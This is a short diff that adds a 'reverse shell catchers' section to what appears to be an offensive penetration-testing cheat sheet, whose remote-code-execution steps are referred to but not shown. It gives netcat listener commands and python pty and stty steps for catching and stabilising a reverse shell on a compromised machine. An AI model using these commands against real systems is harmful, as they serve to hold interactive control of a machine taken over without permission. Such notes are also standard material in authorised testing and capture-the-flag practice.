@@ -1,0 +1,11 @@
+REVERSE SHELL CATCHERS (use after any RCE above)
+bash# Listener
+nc -lvnp 4444
+# or stabilized
+rlwrap nc -lvnp 4444
+
+# Upgrade shell to full TTY (after reverse shell lands)
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+# Ctrl+Z then:
+stty raw -echo; fg
